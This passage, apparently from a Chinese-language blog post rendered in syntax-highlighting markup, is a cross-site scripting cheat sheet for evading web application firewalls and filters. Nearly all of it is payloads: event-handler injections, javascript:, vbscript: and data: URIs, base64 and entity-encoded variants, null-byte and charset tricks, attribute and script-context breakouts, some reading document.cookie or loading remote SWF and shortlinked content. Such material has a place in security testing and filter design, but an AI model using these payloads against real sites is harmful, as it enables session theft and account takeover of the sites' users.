class="string">alert(25)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(26)</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://0x.lv/xss.swf"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert(29);"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0;</span></span></span><br><span class="line"><span class="tag"><span class="string">url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"</span>&gt;</span>^_^</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(30)</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(31)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">javascript:alert(32)</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(33)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(34)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.2.1 如果大小写不行的话，<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">被过滤尝试&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;；</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="xml">2.2.2使用<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签测试</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">“http://www.google.com</span>"&gt;</span>Clickme<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">&lt;a被过滤？</span></span><br><span class="line"><span class="undefined">href被过滤？</span></span><br><span class="line"><span class="undefined">其他内容被过滤？</span></span><br><span class="line"><span class="undefined">如果没有过滤尝试使用</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">”javascript:alert(1)”</span>&gt;</span>Clickme<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">尝试使用错误的事件查看过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"rhainfosec.com"</span><span class="attr">onclimbatree</span>=<span class="string">alert(1)</span>&gt;</span>ClickHere<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">HTML5拥有150个事件处理函数，可以多尝试其他函数</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onhashchange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span>clickit</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.3 测试其他标签</span></span><br><span class="line"><span class="undefined">src属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">aaa.jpg</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="undefined">iframe</span></span><br><span class="line"><span class="javascript">&lt;iframesrc=<span class="string">"javascript:alert(2)"</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="</span>&gt;</span></span></span><br><span class="line"><span class="undefined">Embed</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">embed</span>/<span class="attr">src</span>=<span class="string">//goo.gl/nlX0P</span>&gt;</span></span></span><br><span class="line"><span class="undefined">Action</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">data:text/html,</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="undefined">mario验证</span></span><br><span class="line"><span class="javascript">&lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"pln"</span>&gt;    <span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="tag"</span>&gt;</span>&amp;lt;formaction<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="pun"</span>&gt;</span>=<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="atv"</span>&gt;</span>&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="tag"</span>&gt;</span>&amp;gt;&amp;lt;button&amp;gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="pln"</span>&gt;</span>CLICK<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined">“formaction”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindexformaction="javascript:alert(1)"</span>     <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">formaction</span>=<span class="string">JaVaScript:alert(0)</span>&gt;</span></span></span><br><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">buttonformaction=javascript&amp;colon;alert(1)</span>&gt;</span>CLICKME</span></span><br><span class="line"><span class="undefined">“background”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> // Works on Opera10.5      and IE6</span></span><br><span class="line"><span class="undefined">“posters” 属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">poster</span>=<span class="string">javascript:alert(1)//</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // Works Upto Opera10.5</span></span><br><span class="line"><span class="undefined">“data”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;object/data=<span class="comment">//goo.gl/nlX0P?</span></span></span><br><span class="line"><span class="undefined">“code”属性</span></span><br><span class="line"><span class="javascript">&lt;applet code=<span class="string">"javascript:confirm(document.cookie);"</span>&gt; <span class="comment">// FirefoxOnly</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">embed</span>  <span class="attr">code</span>=<span class="string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span>     <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span></span></span><br><span class="line"><span class="undefined">事件处理</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span>/</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span></span><br><span class="line"><span class="undefined">短payload</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">q</span>/<span class="attr">oncut</span>=<span class="string">open()</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">q</span>/<span class="attr">oncut</span>=<span class="string">alert(1)</span>&gt;</span> //      Useful in-case of payloadrestrictions.</span></span><br><span class="line"><span class="undefined">嵌套欺骗</span></span><br><span class="line"><span class="undefined">&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>  <span class="attr">language</span>=<span class="string">vbsonload</span>=<span class="string">alert-1</span> // <span class="attr">Works</span> <span class="attr">with</span> <span class="attr">IE8</span></span></span></span><br><span class="line"><span class="javascript">&lt;commandonmouseover=<span class="string">"\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6  9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"</span>&gt;Save&lt;<span class="regexp">/command&gt;     /</span><span class="regexp">/ Works with IE8</span></span></span><br><span class="line"><span class="undefined">圆括号被过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"javascript:window.onerror=alert;throw 1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"javascript:window.onerror=alert;throw 1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">javascript:window.onerror</span>=<span class="string">eval;throw&amp;#039;</span>=<span class="string">alert\x281\x29&amp;#039;;</span></span></span></span><br><span class="line"><span class="undefined">Expression 属性</span></span><br><span class="line"><span class="javascript">&lt;img style=<span class="string">"xss:expression(alert(0))"</span>&gt; <span class="comment">// Works upto IE7.</span></span></span><br><span class="line"><span class="javascript">&lt;div style=<span class="string">"color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>     <span class="comment">// Works upto IE7.</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">#test&#123;x:expression(alert(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>     // Works upto IE7</span></span><br><span class="line"><span class="undefined">“location”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">location</span>=<span class="string">’javascript:alert(1)</span>&gt;</span>click</span></span><br><span class="line"><span class="undefined">&lt;body onfocus="location=&amp;#039;javascrpt:alert(1) &gt;123</span></span><br><span class="line"><span class="undefined">其他Payload</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>     <span class="attr">content</span>=<span class="string">"0;url=//goo.gl/nlX0P"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>     <span class="attr">content</span>=<span class="string">"0;javascript&amp;colon;alert(1)"</span>/&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">g</span>     <span class="attr">onload</span>=<span class="string">"javascript:\u0061lert(1);"</span>&gt;</span><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span> <span class="comment">//     By @secalert</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:xlink</span>=<span class="string">" r=100 /&gt;&lt;animateattributeName="</span><span class="attr">xlink:href</span>"     <span class="attr">values</span>=<span class="string">";javascript:alert(1)"</span> <span class="attr">begin</span>=<span class="string">"0s"</span>     <span class="attr">dur</span>=<span class="string">"0.1s"</span> <span class="attr">fill</span>=<span class="string">"freeze"</span>/&gt;</span> // By Mario</span></span><br><span class="line"><span class="undefined">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt;     // By @secalert</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)"</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"//jsfiddle.NET/t846h/"</span>&gt;</span>click // ByAshar Javed</span></span><br><span class="line"><span class="undefined">（）；：被过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40/1/&amp;#41</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>     // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line"> ) is html encoded to &amp;#41</span><br><span class="line">Opera的变量</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40      1&amp;#41 // Workswith Opera Only</span></span><br><span class="line"><span class="undefined">实体解码</span></span><br><span class="line"><span class="javascript">&amp;lt;<span class="regexp">/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/</span>script&amp;gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">编码</span></span><br><span class="line"><span class="undefined">JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码</span></span><br><span class="line"><span class="undefined">（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</span></span><br><span class="line"><span class="undefined">href=</span></span><br><span class="line"><span class="undefined">action=</span></span><br><span class="line"><span class="undefined">formaction=</span></span><br><span class="line"><span class="undefined">location=</span></span><br><span class="line"><span class="undefined">on*=</span></span><br><span class="line"><span class="undefined">name=</span></span><br><span class="line"><span class="undefined">background=</span></span><br><span class="line"><span class="undefined">poster=</span></span><br><span class="line"><span class="undefined">src=</span></span><br><span class="line"><span class="undefined">code=</span></span><br><span class="line"><span class="javascript">data= <span class="comment">//只支持base64</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.4 基于上下文的过滤</span></span><br><span class="line"><span class="undefined">WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.4.1 输入反射属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inputvalue="XSStest"</span> <span class="attr">type</span>=<span class="string">text</span>&gt;</span></span></span><br><span class="line"><span class="javascript">我们可以使用 “&gt;<span class="xml"><span class="tag">&lt;<span class="name">imgsrc=x</span>  <span class="attr">onerror</span>=<span class="string">prompt(0);</span>&gt;</span>触发，但是如果<span class="tag">&lt;&gt;</span>被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onmouseover="</span>prompt(<span class="number">0</span>) x=<span class="string">"</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onfocusin=alert(1)     autofocus x="</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onfocusout=alert(1)     autofocus x="</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onblur=alert(1) autofocus     a="</span></span></span><br><span class="line"><span class="xml">输入反射在<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">标签内</span></span></span><br><span class="line"><span class="undefined">类似这种情况：</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">Var</span></span><br><span class="line"><span class="undefined">x=”Input”;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">通常，我们使用“&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>,闭合前面的<span class="tag">&lt;/<span class="name">script</span>&gt;</span>标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()</span><br><span class="line">confirm() ，例如：</span><br><span class="line">“;alert(1)//</span><br><span class="line">    </span><br><span class="line">2.4.3 超文本内容</span><br><span class="line">代码中的情况如下</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">”Userinput”</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">可以使用javascript:alert(1)//直接执行<span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">”javascript:alert(1)//”</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.4.4 变形</span><br><span class="line">主要包含大小写和JavaScript变形</span><br><span class="line">javascript&amp;#058;alert(1)</span><br><span class="line">javaSCRIPT&amp;colon;alert(1)</span><br><span class="line">JaVaScRipT:alert(1)</span><br><span class="line">javas&amp;Tab;cript:\u0061lert(1);</span><br><span class="line">javascript:\u0061lert&amp;#x28;1&amp;#x29</span><br><span class="line">avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;     // AsharJaved</span><br><span class="line">IE10以下和URI中可以使用VBScript</span><br><span class="line">vbscript:alert(1);</span><br><span class="line">vbscript&amp;#058;alert(1);</span><br><span class="line">vbscr&amp;Tab;ipt:alert(1)"</span><br><span class="line">Data URl</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">    </span><br><span class="line">2.4.5JSON内容</span><br><span class="line">反射输入</span><br><span class="line">encodeURIComponent(&amp;#039;userinput&amp;#039;)</span><br><span class="line">可以使用</span><br><span class="line">-alert(1)-</span><br><span class="line">-prompt(1)-</span><br><span class="line">-confirm(1)-</span><br><span class="line">结果</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)</span><br><span class="line"></span><br><span class="line">2.4.6 输入反射在svg标签内</span><br><span class="line">源码如下：</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">varmyvar=”YourInput”;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">可以输入</span><br><span class="line">www.site.com/test.PHP?var=text”;alert(1)//</span><br><span class="line">如果系统编码了”字符</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">varmyvar=<span class="string">"text&amp;quot;;alert(1)//"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理</span><br><span class="line">浏览器BUG</span><br><span class="line">    </span><br><span class="line">2.4.7 字符集BUG</span><br><span class="line">字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。</span><br><span class="line">示例</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span><br><span class="line">可以控制编码，提交</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;<span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(0);</span>&gt;</span></span><br><span class="line">可以修改为UTF-32编码形式</span><br><span class="line">???script?alert(1)?/script?</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span><br><span class="line">    </span><br><span class="line">2.4.8 空字节</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line"><span class="tag">&lt;<span class="name">scri%00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scri\x00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span>confirm(0);<span class="tag">&lt;/<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span></span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line">    </span><br><span class="line">2.4.9 语法BUG</span><br><span class="line">RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%0ascript</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%0bscript</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</span><br><span class="line"><span class="tag">&lt;//     <span class="attr">style</span>=<span class="string">x:expression\28write(1)\29</span>&gt;</span> // Works upto IE7 参考http://html5sec.org/#71</span><br><span class="line"><span class="comment">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script     --&gt;</span> // Worksupto IE9 参考http://html5sec.org/#115</span><br><span class="line"><span class="meta">&lt;?xml-stylesheet     type="text/css"?&gt;</span><span class="tag">&lt;<span class="name">root</span>    <span class="attr">style</span>=<span class="string">"x:expression(write(1))"</span>/&gt;</span> // Works in IE7 参考http://html5sec.org/#77</span><br><span class="line"><span class="tag">&lt;<span class="name">%div%20style=xss:expression(prompt(1))</span>&gt;</span>     // Works Upto IE7</span><br><span class="line">    </span><br><span class="line">2.4.10Unicode分隔符</span><br><span class="line">[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：</span><br><span class="line">IExplorer=     [0x09,0x0B,0x0C,0x20,0x3B]</span><br><span class="line">Chrome =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Safari = [0x2C,0x3B]</span><br><span class="line">FireFox=     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Opera = [0x09,0x20,0x2C,0x3B]</span><br><span class="line">Android =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">x0b在Mod_security中已经被过滤，绕过的方法：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">onmouseover</span>[\<span class="attr">x0b</span>]=<span class="string">location</span>=<span 